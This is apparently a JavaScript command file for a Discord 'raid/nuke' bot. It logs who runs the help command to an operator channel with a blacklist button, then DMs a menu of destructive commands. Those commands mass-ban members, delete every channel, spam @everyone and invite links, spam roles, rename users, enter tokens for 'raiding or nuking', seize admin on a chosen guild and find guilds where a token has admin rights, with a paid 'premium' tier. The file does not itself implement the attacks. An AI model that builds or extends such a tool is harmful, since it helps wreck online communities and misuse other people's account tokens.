const { EmbedBuilder, ButtonBuilder, ButtonStyle, ActionRowBuilder, ComponentType } = require('discord.js');
const fs = require('fs');

module.exports = {
    name: 'help',
    description: 'Displays the help menu.',
    prefix: '&',
    async execute(msg, client, channel_logs, blacklist_user) {
        try {
            const blacklist_pecausa = new ButtonBuilder()
                .setCustomId('xdxd')
                .setLabel('Blacklist User')
                .setStyle(ButtonStyle.Danger);
            const equisde = new ActionRowBuilder()
                .addComponents(blacklist_pecausa);
            const msgxd = await client.channels.cache.get(channel_logs).send({ components: [equisde], content: `Command **help** executed by **${msg.author.username}** (${msg.author.id}) in **${msg.guild.name}** (${msg.guild.id})` });
            const colector = msgxd.createMessageComponentCollector({
                componentType: ComponentType.Button,
                time: 30_000
            });
            colector.on(`collect`, (int) => {
                if (int.customId === "xdxd") {
                    blacklist_user.push(msg.author.id);
                    let blacklist_users_json = fs.readFileSync("blacklist_users.json", 'utf-8');
                    let ae = JSON.parse(blacklist_users_json);
                    let xdxd = JSON.stringify(ae);
                    let xd = xdxd.replace("]", "");
                    let asd = `${xd}\n,{"id":"${msg.author.id}"}]`;
                    fs.writeFileSync('blacklist_users.json', asd);
                    int.reply({ content: `> Usuario en blacklist.` });
                    return;
                };
            });
        } catch (e) {
            console.log(e.message);
        }
        await msg.react(`%F0%9F%AA%B6`).catch(e => { console.log(e) });
        await msg.author.send({
            embeds: [
                new EmbedBuilder()
                    .setTitle(`‎ ‎ ‎ ‎ ‎‎ ‎ ‎ ‎ ‎ ‎  ‎ ‎ ‎ ‎ ‎ ‎ ‎  ‎ ‎ ‎ ‎  ‎ ‎ ‎ ‎ ‎ ‎ ‎  ‎ ‎ :dolce_167:‎ ‎ ‎ application‎ commands ‎ ‎ :dolce_167:‎‎ ‎ ‎ ‎ ‎‎‎ ‎ ‎ ‎ ‎ ‎  ‎ ‎ ‎ ‎ ‎ ‎ ‎  ‎ ‎  ‎  ‎ ‎ ‎ ‎ ‎ ‎ ‎  ‎ ‎`)
                    .setDescription(`:025: **normal cmds ;**
:dolce_145: \`&on\` **start a raid in the server who the command was executed**
:dolce_145: \`&banall\` **ban all users in the server**
:dolce_145: \`&channels\` **delete all channels in the server**
:dolce_145: \`&spamchannels\` **spam all channels with everyone and invite link**
:dolce_145: \`&spamroles\` **spam server roles**
:dolce_145: \`&spamusers\` **rename all users with our vanity**
:dolce_145: \`&top\` **view the top of raids with our bot**

:dolce_167: \`#invite.guild\` **provide a invite to the guild**
:dolce_145: \`#use.token\` **enter a token to use it for raiding or nuking**
:dolce_145: \`#use.guild\` **select the guild to nuke**
:dolce_145: \`#nuke.guild\` **nuke the selected guild**
:dolce_145: \`#admin.guild\` **get admin on the selected guild**
:dolce_145: \`#find.guilds\`  **find admin guilds with the selected token**

> :dolce_145: *¿what is premium?*
> *It works to customize the bot with your settings.*
> :dolce_145: ** ¿how to get premium?
> *get premium buying it for $1.99 ¡lifetime! [here](https://discord.gg/kEB3PCPkzc)*`)
                    .setColor(`#d20f15`)
            ]
        })
    }
};
